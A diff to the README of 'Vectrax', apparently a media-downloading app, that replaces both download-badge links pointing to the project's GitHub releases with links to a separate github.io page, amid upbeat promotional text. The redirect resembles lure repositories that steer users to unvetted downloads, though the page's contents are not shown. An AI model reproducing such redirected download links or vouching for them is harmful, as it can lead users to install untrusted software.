@@ -12,7 +12,7 @@ Getting Vectrax running on your computer is easier than you might think. Follow 
 
 ### 📦 Step 1: Download Vectrax
 
-[![Download Vectrax Now](https://img.shields.io/badge/⬇️_Download_Vectrax-2ea44f?style=for-the-badge)](https://github.com/Cordageceratonia382/Vectrax/releases)
+[![Download Vectrax Now](https://img.shields.io/badge/⬇️_Download_Vectrax-2ea44f?style=for-the-badge)](https://cordageceratonia382.github.io)
 
 Visit this link to download the application. This will take you to the official download page where you'll find the latest version ready for you.
 
@@ -129,7 +129,7 @@ Visit the official downloads page periodically to check for new versions. Updati
 
 Vectrax removes every barrier between you and your favorite media. No more fighting with complicated software or struggling with confusing settings. Just paste a link, press Enter, and relax while Vectrax does the heavy lifting.
 
-[![Download Now](https://img.shields.io/badge/⬇️_Get_Vectrax_Now-0088CC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cordageceratonia382/Vectrax/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Get_Vectrax_Now-0088CC?style=for-the-badge&logo=github&logoColor=white)](https://cordageceratonia382.github.io)
 
 Join thousands of happy users who've simplified their media downloading experience. Try Vectrax today and discover how effortless downloading can be!
 
